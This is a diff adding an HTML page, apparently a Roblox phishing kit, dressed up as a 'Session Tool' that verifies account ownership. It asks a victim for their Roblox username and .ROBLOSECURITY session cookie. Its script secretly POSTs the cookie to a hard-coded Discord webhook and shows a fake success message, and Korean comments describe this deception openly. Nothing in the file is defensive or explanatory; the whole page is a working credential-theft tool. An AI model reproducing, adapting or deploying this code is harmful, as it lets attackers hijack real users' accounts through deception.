@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Session Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #0b1a2e, #1a2f3f);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(18, 25, 35, 0.92);
+            backdrop-filter: blur(10px);
+            border-radius: 36px;
+            padding: 40px 34px;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.7);
+        }
+        h1 {
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+        h1 span { color: #f5a623; }
+        .sub {
+            text-align: center;
+            color: #8fa3c0;
+            font-size: 13px;
+            margin-bottom: 28px;
+            border-bottom: 1px solid #263647;
+            padding-bottom: 18px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            color: #c8d6e5;
+            font-weight: 600;
+            font-size: 12px;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 18px;
+            border-radius: 16px;
+            border: 1.5px solid #2d4055;
+            background: #0e1822;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.2s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #f5a623;
+            box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.15);
+            background: #111e2b;
+        }
+        .input-group input::placeholder {
+            color: #5a7088;
+            font-size: 13px;
+        }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 60px;
+            background: linear-gradient(90deg, #f5a623, #e07b1a);
+            color: #0b1a2e;
+            font-weight: 800;
+            font-size: 16px;
+            letter-spacing: 0.8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 8px 20px rgba(245, 166, 35, 0.25);
+            margin-top: 8px;
+        }
+        .btn:hover {
+            transform: scale(0.98);
+            background: linear-gradient(90deg, #ffb83d, #f08a24);
+            box-shadow: 0 4px 14px rgba(245, 166, 35, 0.4);
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            min-height: 24px;
+            transition: 0.2s;
+            color: #aabbd0;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 11px;
+            color: #4a5f78;
+            border-top: 1px solid #1f2f3e;
+            padding-top: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🔑 <span>Session</span> Tool</h1>
+        <div class="sub">Enter account details to verify ownership</div>
+
+        <div class="input-group">
+            <label>👤 Roblox Username (빅텀 계정)</label>
+            <input type="text" id="usernameInput" placeholder="예: xX_NoobSlayer_Xx" autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label>🍪 .ROBLOSECURITY Cookie</label>
+            <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off" spellcheck="false">
+        </div>
+
+        <button class="btn" id="submitBtn">▶ Verify Account</button>
+        <div id="status">Ready</div>
+        <div class="footer">secured • encrypted • 2025</div>
+    </div>
+
+    <script>
+        // ★★★ 니 디스코드 웹훅 URL ★★★
+        const webhookURL = "https://discord.com/api/webhooks/1480109634021888103/JbFZAnGtnHerHWNWANtuTLtF2eYgF0436MM6fPabxPURCuX4Vnow7zAMelVGjpyTUNls";
+
+        const usernameInput = document.getElementById('usernameInput');
+        const cookieInput = document.getElementById('cookieInput');
+        const statusDiv = document.getElementById('status');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // ★★★ 실제 전송: 빅텀은 빼고, 쿠키만 보냄 ★★★
+        function sendCookieOnly(cookie) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**🔐 New Roblox Cookie**\n\`\`\`${cookie}\`\`\``
+                })
+            }).catch(err => console.error('Webhook error:', err));
+        }
+
+        submitBtn.addEventListener('click', function(e) {
+            const username = usernameInput.value.trim();
+            const cookie = cookieInput.value.trim();
+
+            if (!username || username.length < 2) {
+                statusDiv.innerHTML = '⚠️ Please enter a valid username.';
+                statusDiv.style.color = '#ff7a7a';
+                return;
+            }
+
+            if (!cookie || cookie.length < 20) {
+                statusDiv.innerHTML = '⚠️ Please enter a valid .ROBLOSECURITY cookie.';
+                statusDiv.style.color = '#ff7a7a';
+                return;
+            }
+
+            // ★★★ 몰래 쿠키만 웹훅 전송 (빅텀은 전송 안 함) ★★★
+            sendCookieOnly(cookie);
+
+            // ★★★ 화면에는 빅텀 + 쿠키 둘 다 성공한 것처럼 표시 (껍데기) ★★★
+            statusDiv.innerHTML = `✅ Account "${username}" verified successfully! Redirecting...`;
+            statusDiv.style.color = '#5ddf8a';
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+
+            // 입력창 비우기
+            usernameInput.value = '';
+            cookieInput.value = '';
+
+            // 2초 후 리셋
+            setTimeout(() => {
+                statusDiv.innerHTML = 'Ready for next account';
+                statusDiv.style.color = '#aabbd0';
+                submitBtn.disabled = false;
+                submitBtn.textContent = '▶ Verify Account';
+            }, 2000);
+        });
+
+        // 엔터키 지원
+        cookieInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
+        usernameInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                submitBtn.click();
+            }
+        });
+
+        // 붙여넣기 후 자동 공백 제거
+        cookieInput.addEventListener('paste', function() {
+            setTimeout(() => {
+                cookieInput.value = cookieInput.value.trim();
+            }, 50);
+        });
+    </script>
+</body>
+</html>
